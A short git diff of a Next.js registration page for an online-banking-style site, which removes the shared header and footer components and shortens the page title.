@@ -1,5 +1,4 @@
-import Footer from "../components/Footer";
-import Header from "../components/Header";
+
 import Head from "next/head";
 import { useRouter } from "next/router";
 import Router from "next/router"
@@ -73,10 +72,9 @@ export default function Usuario() {
   return (
     <div className="overflow-x-hidden">
       <Head>
-        <title>Registro | ACH Banca en línea</title>
+        <title>Registro </title>
         <link rel="icon" href="/lafise.webp" />
       </Head>
-      <Header />
       <div className="w-11/12 lg:w-6/12 mx-auto my-10 space-y-5">
         <img src={fotoBanco} className="w-44 mx-auto" />
         <form className="w-10/12 lg:w-5/12 mx-auto space-y-5 pt-5">
@@ -117,7 +115,6 @@ export default function Usuario() {
           </button>
         </form>
       </div>
-      <Footer />
     </div>
   );
 }
